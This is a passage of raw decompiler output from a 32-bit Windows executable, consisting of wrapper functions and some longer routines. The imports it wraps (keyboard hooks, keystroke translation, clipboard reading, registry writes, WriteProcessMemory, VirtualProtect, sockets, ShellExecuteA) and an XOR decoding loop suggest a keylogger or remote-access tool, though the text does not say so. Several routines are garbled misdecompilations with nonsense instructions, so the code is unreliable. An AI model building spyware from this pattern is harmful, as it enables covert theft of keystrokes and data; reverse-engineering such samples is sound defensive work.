    int32_t result; // 0x404368
    return result;
}

// Address range: 0x40436c - 0x404374
int32_t function_40436c(void) {
    // 0x40436c
    g87--;
    int32_t result; // 0x40436c
    return result;
}

// Address range: 0x404374 - 0x40437a
int32_t function_404374(void) {
    // 0x404374
    return RegCloseKey2();
}

// Address range: 0x40437c - 0x404382
int32_t function_40437c(int32_t * hKey, char * lpSubKey, int32_t Reserved, char * lpClass, int32_t dwOptions, int32_t samDesired, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t ** phkResult, int32_t * lpdwDisposition) {
    // 0x40437c
    return RegCreateKeyExA(hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired, lpSecurityAttributes, phkResult, lpdwDisposition);
}

// Address range: 0x404384 - 0x40438a
int32_t function_404384(int32_t * hKey, char * lpSubKey) {
    // 0x404384
    return RegDeleteKeyA(hKey, lpSubKey);
}

// Address range: 0x40438c - 0x404392
int32_t function_40438c(int32_t a1, int32_t * a2, int32_t a3, int32_t a4, char * a5, int32_t a6) {
    // 0x40438c
    return RegOpenKeyExA2();
}

// Address range: 0x404394 - 0x40439a
int32_t function_404394(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4, int32_t a5, char * a6, int32_t a7) {
    // 0x404394
    return RegQueryValueExA2();
}

// Address range: 0x40439c - 0x4043a2
int32_t function_40439c(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData) {
    // 0x40439c
    return RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData, cbData);
}

// Address range: 0x4043a4 - 0x4043aa
bool function_4043a4(int32_t * hObject) {
    // 0x4043a4
    return CloseHandle(hObject);
}

// Address range: 0x4043ac - 0x4043b2
int32_t function_4043ac(int32_t Locale, int32_t dwCmpFlags, char * lpString1, int32_t cchCount1, char * lpString2, int32_t cchCount2) {
    // 0x4043ac
    return CompareStringA(Locale, dwCmpFlags, lpString1, cchCount1, lpString2, cchCount2);
}

// Address range: 0x4043b4 - 0x4043ba
bool function_4043b4(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists) {
    // 0x4043b4
    return CopyFileA(lpExistingFileName, lpNewFileName, bFailIfExists);
}

// Address range: 0x4043bc - 0x4043c2
int32_t * function_4043bc(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile) {
    // 0x4043bc
    return CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

// Address range: 0x4043c4 - 0x4043ca
int32_t * function_4043c4(struct _SECURITY_ATTRIBUTES * lpThreadAttributes, int32_t dwStackSize, int32_t (*lpStartAddress)(int32_t *), int32_t * lpParameter, int32_t dwCreationFlags, int32_t * lpThreadId) {
    // 0x4043c4
    return CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

// Address range: 0x4043cc - 0x4043d2
bool function_4043cc(char * lpFileName) {
    // 0x4043cc
    return DeleteFileA(lpFileName);
}

// Address range: 0x4043d4 - 0x4043da
int32_t function_4043d4(int32_t a1) {
    // 0x4043d4
    return ExitProcess2();
}

// Address range: 0x4043dc - 0x4043e2
int32_t * function_4043dc(int32_t * hModule, char * lpName, char * lpType) {
    // 0x4043dc
    return FindResourceA(hModule, lpName, lpType);
}

// Address range: 0x4043e4 - 0x4043ea
void function_4043e4(int32_t * hLibModule, int32_t dwExitCode) {
    // 0x4043e4
    FreeLibraryAndExitThread(hLibModule, dwExitCode);
}

// Address range: 0x4043ec - 0x4043f2
int32_t * function_4043ec(void) {
    // 0x4043ec
    return GetCurrentProcess();
}

// Address range: 0x4043f4 - 0x4043fa
int32_t function_4043f4(int32_t * hFile, int32_t * lpFileSizeHigh) {
    // 0x4043f4
    return GetFileSize(hFile, lpFileSizeHigh);
}

// Address range: 0x4043fc - 0x404402
int32_t function_4043fc(int32_t * hModule, char * lpFilename, int32_t nSize) {
    // 0x4043fc
    return GetModuleFileNameA(hModule, lpFilename, nSize);
}

// Address range: 0x404404 - 0x40440a
int32_t * function_404404(char * lpModuleName) {
    // 0x404404
    return GetModuleHandleA(lpModuleName);
}

// Address range: 0x40440c - 0x404412
int32_t (*function_40440c(int32_t * hModule, char * lpProcName))() {
    // 0x40440c
    return GetProcAddress(hModule, lpProcName);
}

// Address range: 0x404414 - 0x40441a
int32_t function_404414(int32_t nBufferLength, char * lpBuffer) {
    // 0x404414
    return GetTempPathA(nBufferLength, lpBuffer);
}

// Address range: 0x40441c - 0x404422
int32_t function_40441c(void) {
    // 0x40441c
    return GetTickCount2();
}

// Address range: 0x404424 - 0x40442a
int32_t * function_404424(int32_t uFlags, int32_t dwBytes) {
    // 0x404424
    return GlobalAlloc(uFlags, dwBytes);
}

// Address range: 0x40442c - 0x404432
int32_t * function_40442c(int32_t * hMem) {
    // 0x40442c
    return GlobalFree(hMem);
}

// Address range: 0x404434 - 0x40443a
int32_t * function_404434(int32_t * hMem) {
    // 0x404434
    return GlobalLock(hMem);
}

// Address range: 0x40443c - 0x404442
bool function_40443c(int32_t * hMem) {
    // 0x40443c
    return GlobalUnlock(hMem);
}

// Address range: 0x404444 - 0x40444a
int32_t * function_404444(char * lpLibFileName) {
    // 0x404444
    return LoadLibraryA(lpLibFileName);
}

// Address range: 0x40444c - 0x404452
bool function_40444c(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped) {
    // 0x40444c
    return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

// Address range: 0x404454 - 0x40445a
bool function_404454(int32_t * hFile) {
    // 0x404454
    return SetEndOfFile(hFile);
}

// Address range: 0x40445c - 0x404462
void function_40445c(int32_t dwMilliseconds) {
    // 0x40445c
    Sleep(dwMilliseconds);
}

// Address range: 0x404464 - 0x40446a
bool function_404464(int32_t * lpAddress, int32_t dwSize, int32_t flNewProtect, int32_t * lpflOldProtect) {
    // 0x404464
    return VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

// Address range: 0x40446c - 0x404472
int32_t function_40446c(void) {
    // 0x40446c
    return WriteFile2();
}

// Address range: 0x404474 - 0x40447a
bool function_404474(int32_t * hProcess, int32_t * lpBaseAddress, int32_t * lpBuffer, int32_t nSize, int32_t * lpNumberOfBytesWritten) {
    // 0x404474
    return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

// Address range: 0x40447c - 0x404482
int32_t function_40447c(char * lpString1, char * lpString2) {
    // 0x40447c
    return lstrcmpiA(lpString1, lpString2);
}

// Address range: 0x404484 - 0x40448a
char * function_404484(char * lpString1, char * lpString2) {
    // 0x404484
    return lstrcpyA(lpString1, lpString2);
}

// Address range: 0x40448c - 0x404492
bool function_40448c(int32_t * hdc, int32_t iFirst, int32_t iLast, int32_t * lpBuffer) {
    // 0x40448c
    return GetCharWidthA(hdc, iFirst, iLast, lpBuffer);
}

// Address range: 0x404494 - 0x40449a
int32_t * function_404494(int32_t i) {
    // 0x404494
    return GetStockObject(i);
}

// Address range: 0x40449c - 0x4044a2
int32_t * function_40449c(int32_t * hdc, int32_t * h) {
    // 0x40449c
    return SelectObject(hdc, h);
}

// Address range: 0x4044a4 - 0x4044aa
int32_t function_4044a4(int32_t * hhk, int32_t nCode, int32_t wParam, int32_t lParam) {
    // 0x4044a4
    return CallNextHookEx(hhk, nCode, wParam, lParam);
}

// Address range: 0x4044ac - 0x4044b2
bool function_4044ac(void) {
    // 0x4044ac
    return CloseClipboard();
}

// Address range: 0x4044b4 - 0x4044ba
int32_t function_4044b4(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x4044b4
    return DefWindowProcA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x4044bc - 0x4044c2
int32_t function_4044bc(struct tagMSG * lpMsg) {
    // 0x4044bc
    return DispatchMessageA(lpMsg);
}

// Address range: 0x4044c4 - 0x4044ca
bool function_4044c4(bool (*lpEnumFunc)(int32_t *, int32_t), int32_t lParam) {
    // 0x4044c4
    return EnumWindows(lpEnumFunc, lParam);
}

// Address range: 0x4044cc - 0x4044d2
int32_t * function_4044cc(char * lpClassName, char * lpWindowName) {
    // 0x4044cc
    return FindWindowA(lpClassName, lpWindowName);
}

// Address range: 0x4044d4 - 0x4044da
int32_t * function_4044d4(int32_t * hWndParent, int32_t * hWndChildAfter, char * lpszClass, char * lpszWindow) {
    // 0x4044d4
    return FindWindowExA(hWndParent, hWndChildAfter, lpszClass, lpszWindow);
}

// Address range: 0x4044dc - 0x4044e2
bool function_4044dc(struct tagPOINT * lpPoint) {
    // 0x4044dc
    return GetCaretPos(lpPoint);
}

// Address range: 0x4044e4 - 0x4044ea
int32_t function_4044e4(int32_t * hWnd, int32_t nIndex) {
    // 0x4044e4
    return GetClassLongA(hWnd, nIndex);
}

// Address range: 0x4044ec - 0x4044f2
int32_t function_4044ec(int32_t * hWnd, char * lpClassName, int32_t nMaxCount) {
    // 0x4044ec
    return GetClassNameA(hWnd, lpClassName, nMaxCount);
}

// Address range: 0x4044f4 - 0x4044fa
int32_t * function_4044f4(int32_t uFormat) {
    // 0x4044f4
    return GetClipboardData(uFormat);
}

// Address range: 0x4044fc - 0x404502
int32_t * function_4044fc(int32_t * hWnd) {
    // 0x4044fc
    return GetDC(hWnd);
}

// Address range: 0x404504 - 0x40450a
bool function_404504(char * lpKeyState) {
    // 0x404504
    return GetKeyboardState(lpKeyState);
}

// Address range: 0x40450c - 0x404512
bool function_40450c(struct tagMSG * lpMsg, int32_t * hWnd, int32_t wMsgFilterMin, int32_t wMsgFilterMax) {
    // 0x40450c
    return GetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}

// Address range: 0x404514 - 0x40451a
int32_t * function_404514(int32_t * hWnd) {
    // 0x404514
    return GetParent(hWnd);
}

// Address range: 0x40451c - 0x404522
int32_t * function_40451c(int32_t * hWnd) {
    // 0x40451c
    return GetTopWindow(hWnd);
}

// Address range: 0x404524 - 0x40452a
int32_t * function_404524(int32_t * hWnd, int32_t uCmd) {
    // 0x404524
    return GetWindow(hWnd, uCmd);
}

// Address range: 0x40452c - 0x404532
int32_t function_40452c(int32_t * hWnd, int32_t nIndex) {
    // 0x40452c
    return GetWindowLongA(hWnd, nIndex);
}

// Address range: 0x404534 - 0x40453a
int32_t function_404534(int32_t * hWnd, int32_t * lpdwProcessId) {
    // 0x404534
    return GetWindowThreadProcessId(hWnd, lpdwProcessId);
}

// Address range: 0x40453c - 0x404542
bool function_40453c(int32_t * hWnd) {
    // 0x40453c
    return IsWindow(hWnd);
}

// Address range: 0x404544 - 0x40454a
bool function_404544(int32_t * hWnd) {
    // 0x404544
    return IsWindowVisible(hWnd);
}

// Address range: 0x40454c - 0x404552
bool function_40454c(int32_t * hWnd, int32_t uIDEvent) {
    // 0x40454c
    return KillTimer(hWnd, uIDEvent);
}

// Address range: 0x404554 - 0x40455a
int32_t * function_404554(int32_t * hInstance, char * lpIconName) {
    // 0x404554
    return LoadIconA(hInstance, lpIconName);
}

// Address range: 0x40455c - 0x404562
bool function_40455c(int32_t * hWndNewOwner) {
    // 0x40455c
    return OpenClipboard(hWndNewOwner);
}

// Address range: 0x404564 - 0x40456a
bool function_404564(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x404564
    return PostMessageA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x40456c - 0x404572
void function_40456c(int32_t nExitCode) {
    // 0x40456c
    PostQuitMessage(nExitCode);
}

// Address range: 0x404574 - 0x40457a
int32_t function_404574(int32_t * hWnd, int32_t * hDC) {
    // 0x404574
    return ReleaseDC(hWnd, hDC);
}

// Address range: 0x40457c - 0x404582
int32_t function_40457c(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x40457c
    return SendMessageA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x404584 - 0x40458a
int32_t function_404584(int32_t * hWnd, int32_t nIDEvent, int32_t uElapse, void (*lpTimerFunc)(int32_t *, int32_t, int32_t, int32_t)) {
    // 0x404584
    return SetTimer(hWnd, nIDEvent, uElapse, lpTimerFunc);
}

// Address range: 0x40458c - 0x404592
int32_t function_40458c(int32_t * hWnd, int32_t nIndex, int32_t dwNewLong) {
    // 0x40458c
    return SetWindowLongA(hWnd, nIndex, dwNewLong);
}

// Address range: 0x404594 - 0x40459a
int32_t * function_404594(int32_t idHook, int32_t (*lpfn)(int32_t, int32_t, int32_t), int32_t * hmod, int32_t dwThreadId) {
    // 0x404594
    return SetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);
}

// Address range: 0x40459c - 0x4045a2
int32_t function_40459c(int32_t uVirtKey, int32_t uScanCode, char * lpKeyState, int16_t * lpChar, int32_t uFlags) {
    // 0x40459c
    return ToAscii(uVirtKey, uScanCode, lpKeyState, lpChar, uFlags);
}

// Address range: 0x4045a4 - 0x4045aa
bool function_4045a4(int32_t * hhk) {
    // 0x4045a4
    return UnhookWindowsHookEx(hhk);
}

// Address range: 0x4045ac - 0x4045b3
int32_t function_4045ac(void) {
    // 0x4045ac
    return function_4025bc();
}

// Address range: 0x4045b4 - 0x4045ba
int32_t * function_4045b4(int32_t dwExStyle, char * lpClassName, char * lpWindowName, int32_t dwStyle, int32_t X, int32_t Y, int32_t nWidth, int32_t nHeight, int32_t * hWndParent, int32_t * hMenu, int32_t * hInstance, int32_t * lpParam) {
    // 0x4045b4
    return CreateWindowExA(dwExStyle, lpClassName, lpWindowName, dwStyle, X, Y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
}

// Address range: 0x4045bc - 0x404613
int32_t function_4045bc(int32_t hWndParent, int32_t nHeight, int32_t nWidth, int32_t Y, int32_t X, int32_t dwStyle, int32_t lpWindowName, int32_t lpClassName, int32_t dwExStyle) {
    // 0x4045bc
    int32_t v1; // 0x4045bc
    int32_t v2; // 0x4045bc
    int32_t v3; // 0x4045bc
    int32_t v4; // 0x4045bc
    int32_t hMenu; // 0x4045bc
    function_402634(v3, hMenu, v4, v2, v1);
    int32_t hInstance; // 0x4045bc
    int32_t lpParam; // 0x4045bc
    int32_t * windowHandle = CreateWindowExA(dwExStyle, (char *)lpClassName, (char *)lpWindowName, dwStyle, X, Y, nWidth, nHeight, (int32_t *)hWndParent, (int32_t *)hMenu, (int32_t *)hInstance, (int32_t *)lpParam); // 0x4045fb
    function_402624();
    return (int32_t)windowHandle;
}

// Address range: 0x404614 - 0x404639
int32_t function_404614(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40461f
    __writefsdword(0, (int32_t)&v1);
    g88++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404639 - 0x40463e
int32_t function_404639(void) {
    // 0x404639
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40463e - 0x404640
int32_t function_40463e(void) {
    // 0x40463e
    int32_t result; // 0x40463e
    return result;
}

// Address range: 0x404640 - 0x404642
int32_t function_404640(int32_t a1) {
    // 0x404640
    int32_t result; // 0x404640
    return result;
}

// Address range: 0x404644 - 0x40464c
int32_t function_404644(void) {
    // 0x404644
    g88--;
    int32_t result; // 0x404644
    return result;
}

// Address range: 0x40464f - 0x4046c1
int32_t function_40464f(void) {
    // 0x40464f
    int32_t v1; // 0x40464f
    *(int32_t *)v1 = v1 - 1;
    int32_t v2; // 0x40464f
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    uint32_t v4; // 0x40464f
    char * v5 = (char *)(v4 + 101); // 0x404653
    char v6 = v4 / 256; // 0x404653
    *v5 = *v5 + v6;
    int32_t v7 = 0x6c6c642e * *(int32_t *)(v1 + 101); // 0x404658
    *(char *)v2 = *(char *)&v2 + v6;
    int32_t v8 = v2;
    *(char *)v8 = *(char *)&v2 + (char)v8;
    int32_t v9 = v2;
    *(char *)v9 = *(char *)&v2 + (char)v9;
    int32_t v10 = v2;
    *(char *)v10 = *(char *)&v2 + (char)v10;
    int32_t v11; // 0x40464f
    char * v12 = (char *)(v11 - 117); // 0x404667
    *v12 = *v12 + (char)v4;
    __asm_in((int16_t)v4);
    *(int32_t *)(v7 - 8) = 0x4046c1;
    int32_t v13 = __readfsdword(0); // 0x404673
    int32_t v14 = v7 - 12; // 0x404673
    int32_t * v15 = (int32_t *)v14; // 0x404673
    *v15 = v13;
    __writefsdword(0, v14);
    int32_t v16 = g89 + 1; // 0x404679
    g89 = v16;
    if (v16 == 0) {
        // 0x404681
        function_403370();
        function_403370();
        function_403370();
        function_403370();
        function_403370();
    }
    // 0x4046b3
    __writefsdword(0, *v15);
    *(int32_t *)(v7 - 4) = 0x4046c8;
    return 0;
}

// Address range: 0x4046c1 - 0x4046c6
int32_t function_4046c1(void) {
    // 0x4046c1
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4046c6 - 0x4046c8
int32_t function_4046c6(void) {
    // 0x4046c6
    int32_t result; // 0x4046c6
    return result;
}

// Address range: 0x4046c8 - 0x4046ca
int32_t function_4046c8(int32_t a1) {
    // 0x4046c8
    int32_t result; // 0x4046c8
    return result;
}

// Address range: 0x4046cc - 0x4046d4
int32_t function_4046cc(void) {
    // 0x4046cc
    g89--;
    int32_t result; // 0x4046cc
    return result;
}

// Address range: 0x4046d4 - 0x40470d
int32_t function_4046d4(void) {
    int32_t v1 = function_403720(); // 0x4046db
    int32_t result = function_4034c8(); // 0x4046e6
    int32_t result2 = result; // 0x4046ed
    int32_t v2 = 0; // 0x4046ed
    if (result < 1) {
        // 0x404709
        return result;
    }
    int32_t v3 = v1; // 0x4046ed
    char * v4 = (char *)v3; // 0x4046f5
    *v4 = *v4 ^ *(char *)(v2 + (int32_t)&g25);
    int32_t v5 = v2 + 1 & -0x7ffffff9; // 0x4046f9
    v2 = v5 >= 0 ? v5 : (v2 | -8) + 1;
    result2--;
    v3++;
    while (result2 != 0) {
        // 0x4046ef
        v4 = (char *)v3;
        *v4 = *v4 ^ *(char *)(v2 + (int32_t)&g25);
        v5 = v2 + 1 & -0x7ffffff9;
        v2 = v5 >= 0 ? v5 : (v2 | -8) + 1;
        result2--;
        v3++;
    }
    // 0x404709
    return result2;
}

// Address range: 0x404710 - 0x404735
int32_t function_404710(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40471b
    __writefsdword(0, (int32_t)&v1);
    g90++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404735 - 0x40473a
int32_t function_404735(void) {
    // 0x404735
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40473a - 0x40473c
int32_t function_40473a(void) {
    // 0x40473a
    int32_t result; // 0x40473a
    return result;
}

// Address range: 0x40473c - 0x40473e
int32_t function_40473c(int32_t a1) {
    // 0x40473c
    int32_t result; // 0x40473c
    return result;
}

// Address range: 0x404740 - 0x404748
int32_t function_404740(void) {
    // 0x404740
    g90--;
    int32_t result; // 0x404740
    return result;
}

// Address range: 0x404748 - 0x40476d
int32_t function_404748(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404753
    __writefsdword(0, (int32_t)&v1);
    g91++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40476d - 0x404772
int32_t function_40476d(void) {
    // 0x40476d
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404772 - 0x404774
int32_t function_404772(void) {
    // 0x404772
    int32_t result; // 0x404772
    return result;
}

// Address range: 0x404774 - 0x404776
int32_t function_404774(int32_t a1) {
    // 0x404774
    int32_t result; // 0x404774
    return result;
}

// Address range: 0x404778 - 0x404780
int32_t function_404778(void) {
    // 0x404778
    g91--;
    int32_t result; // 0x404778
    return result;
}

// Address range: 0x404780 - 0x404786
int32_t function_404780(int32_t s) {
    // 0x404780
    return closesocket(s);
}

// Address range: 0x404788 - 0x40478e
int32_t function_404788(int32_t s, struct sockaddr * name, int32_t namelen) {
    // 0x404788
    return connect(s, name, namelen);
}

// Address range: 0x404790 - 0x404796
int16_t function_404790(int16_t hostshort) {
    // 0x404790
    return htons(hostshort);
}

// Address range: 0x404798 - 0x40479e
char * function_404798(struct in_addr in) {
    // 0x404798
    return inet_ntoa(in);
}

// Address range: 0x4047a0 - 0x4047a6
int32_t function_4047a0(int32_t s, char * buf, int32_t len, int32_t flags) {
    // 0x4047a0
    return recv(s, buf, len, flags);
}

// Address range: 0x4047a8 - 0x4047ae
int32_t function_4047a8(int32_t s, char * buf, int32_t len, int32_t flags) {
    // 0x4047a8
    return send(s, buf, len, flags);
}

// Address range: 0x4047b0 - 0x4047b6
int32_t function_4047b0(int32_t af, int32_t type, int32_t protocol) {
    // 0x4047b0
    return socket(af, type, protocol);
}

// Address range: 0x4047b8 - 0x4047be
struct hostent * function_4047b8(char * name) {
    // 0x4047b8
    return gethostbyname(name);
}

// Address range: 0x4047c0 - 0x4047c6
int32_t function_4047c0(char * name, int32_t namelen) {
    // 0x4047c0
    return gethostname(name, namelen);
}

// Address range: 0x4047c8 - 0x4047ce
int32_t function_4047c8(int16_t wVersionRequested, struct WSAData * lpWSAData) {
    // 0x4047c8
    return WSAStartup(wVersionRequested, lpWSAData);
}

// Address range: 0x4047d0 - 0x4047d6
int32_t function_4047d0(void) {
    // 0x4047d0
    return WSACleanup();
}

// Address range: 0x4047d8 - 0x4047fd
int32_t function_4047d8(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4047e3
    __writefsdword(0, (int32_t)&v1);
    g92++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4047fd - 0x404802
int32_t function_4047fd(void) {
    // 0x4047fd
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404802 - 0x404804
int32_t function_404802(void) {
    // 0x404802
    int32_t result; // 0x404802
    return result;
}

// Address range: 0x404804 - 0x404806
int32_t function_404804(int32_t a1) {
    // 0x404804
    int32_t result; // 0x404804
    return result;
}

// Address range: 0x404808 - 0x404810
int32_t function_404808(void) {
    // 0x404808
    g92--;
    int32_t result; // 0x404808
    return result;
}

// Address range: 0x404920 - 0x404a93
int32_t function_404920(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = a6;
    int32_t v2; // 0x404920
    int32_t v3; // 0x404920
    uint32_t v4; // 0x404920
    bool v5; // 0x404920
    bool v6; // 0x404920
    if (v6) {
        int32_t result; // 0x404920
        if (v5) {
            int64_t v7 = (int64_t)*(int32_t *)(v3 + 97); // 0x4049f8
            int64_t v8 = 108 * v7; // 0x4049f8
            if (v8 != 0x6c00000000 * v7 / 0x100000000) {
                // 0x4049fe
                return result;
            }
            unsigned char v9 = (char)v4;
            unsigned char v10 = (char)result + v9; // 0x404a64
            *(char *)v4 = v10;
            if (v10 < v9) {
                // 0x404a68
                return (int32_t)v8 - 4;
            }
            // 0x404a7d
            __writefsdword(0, a7);
            return function_403370();
        }
        // 0x404992
        int32_t v11; // 0x404920
        __asm_arpl((int16_t)result, (int16_t)v11);
        *(int32_t *)v2 = __asm_insd((int16_t)v3);
    }
    int32_t result2; // 0x404920
    bool v12; // 0x404920
    if (v12) {
        bool v13; // 0x404920
        if (!v13) {
            int32_t v14 = result2 + 1; // 0x404a76
            return v14 + v4 / 256 & 255 | v14 & -256;
        }
        // 0x404a0b
        *(char *)v2 = __asm_insb((int16_t)v3);
        *(char *)97 = __asm_insb((int16_t)a4);
        char * v15 = (char *)a1; // 0x404a1a
        *v15 = *v15 + (char)a1;
        v1 = __readfsdword(0);
        __writefsdword(0, (int32_t)&v1);
        g93++;
        __writefsdword(0, v1);
        return 0;
    }
    char v16; // 0x404920
    int32_t v17; // 0x404920
    char v18; // 0x404920
    if (!v5) {
        int32_t v19 = unknown_4a02(); // 0x404999
        result2 = v19;
        char v20 = v19;
        v16 = v20;
        v17 = v19;
        v18 = v20;
    } else {
        // 0x404999
        v16 = result2;
        v17 = result2;
        v18 = *(char *)&result2;
    }
    char * v21 = (char *)&result2;
    *(char *)v17 = v18 + v16;
    int32_t v22 = result2;
    *(char *)v22 = *v21 + (char)v22;
    int32_t v23 = result2;
    *(char *)v23 = *v21 + (char)v23;
    int32_t v24 = result2;
    *(char *)v24 = *v21 + (char)v24;
    int32_t v25 = result2;
    *(char *)v25 = *v21 + (char)v25;
    int32_t v26 = result2;
    *(char *)v26 = *v21 + (char)v26;
    return result2;
}

// Address range: 0x404a93 - 0x404a98
int32_t function_404a93(void) {
    // 0x404a93
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404a98 - 0x404a9a
int32_t function_404a98(void) {
    // 0x404a98
    int32_t result; // 0x404a98
    return result;
}

// Address range: 0x404a9a - 0x404a9d
int32_t function_404a9a(int32_t a1, int32_t a2) {
    // 0x404a9a
    int32_t result; // 0x404a9a
    return result;
}

// Address range: 0x404aa0 - 0x404ab1
int32_t function_404aa0(void) {
    // 0x404aa0
    return function_4033c4();
}

// Address range: 0x404ab7 - 0x404b8b
int32_t function_404ab7(int32_t a1, int32_t a2, int32_t a3) {
    // 0x404ab7
    int32_t v1; // 0x404ab7
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x404aba
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x404b24
        __writefsdword(0, a3);
        return 0;
    }
    // 0x404abe
    int32_t v4; // 0x404ab7
    int16_t v5 = v4; // 0x404adc
    int32_t v6; // 0x404ab7
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x404ab7
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x404ae2
    int32_t v9; // 0x404ab7
    char * v10 = (char *)v9; // 0x404ae2
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x404ae7
    int64_t v12 = 103 * v11; // 0x404ae7
    int32_t v13 = v12; // 0x404ae7
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x404aec
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x404af1
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x404b5c
        unsigned char v17 = v16 + v2; // 0x404b5c
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x404b60
            return function_404aa0();
        }
        // 0x404b75
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x404b92;
        return function_403370();
    }
    // 0x404af6
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v18 = (int32_t *)(v13 - 16); // 0x404afb
    *v18 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v19 = v13 + 4; // 0x404b0c
    int32_t * v20 = (int32_t *)v19; // 0x404b0c
    int32_t v21 = *v20; // 0x404b0c
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v22 = (char *)v21; // 0x404b12
    *v22 = *v22 + (char)v21;
    *v20 = *v18;
    *(int32_t *)v13 = v19;
    *v14 = 0x404b39;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x404b8b - 0x404b90
int32_t function_404b8b(void) {
    // 0x404b8b
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404b90 - 0x404b92
int32_t function_404b90(void) {
    // 0x404b90
    int32_t result; // 0x404b90
    return result;
}

// Address range: 0x404b92 - 0x404b95
int32_t function_404b92(int32_t a1, int32_t a2) {
    // 0x404b92
    int32_t result; // 0x404b92
    return result;
}

// Address range: 0x404b98 - 0x404b9e
int32_t * function_404b98(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd) {
    // 0x404b98
    return ShellExecuteA(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd);
}

// Address range: 0x404ba0 - 0x404bc5
int32_t function_404ba0(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404bab
    __writefsdword(0, (int32_t)&v1);
    g94++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404bc5 - 0x404bca
int32_t function_404bc5(void) {
    // 0x404bc5
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404bca - 0x404bcc
int32_t function_404bca(void) {
    // 0x404bca
    int32_t result; // 0x404bca
    return result;
}

// Address range: 0x404bcc - 0x404bce
int32_t function_404bcc(int32_t a1) {
    // 0x404bcc
    int32_t result; // 0x404bcc
    return result;
}

// Address range: 0x404bd0 - 0x404bd8
int32_t function_404bd0(void) {
    // 0x404bd0
    g94--;
    int32_t result; // 0x404bd0
    return result;
}

// Address range: 0x404bd8 - 0x404bfd
int32_t function_404bd8(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404be3
    __writefsdword(0, (int32_t)&v1);
    g95++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404bfd - 0x404c02
int32_t function_404bfd(void) {
    // 0x404bfd
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404c02 - 0x404c04
int32_t function_404c02(void) {
    // 0x404c02
    int32_t result; // 0x404c02
    return result;
}

// Address range: 0x404c04 - 0x404c06
int32_t function_404c04(int32_t a1) {
    // 0x404c04
    int32_t result; // 0x404c04
    return result;
}

// Address range: 0x404c08 - 0x404c10
int32_t function_404c08(void) {
    // 0x404c08
    g95--;
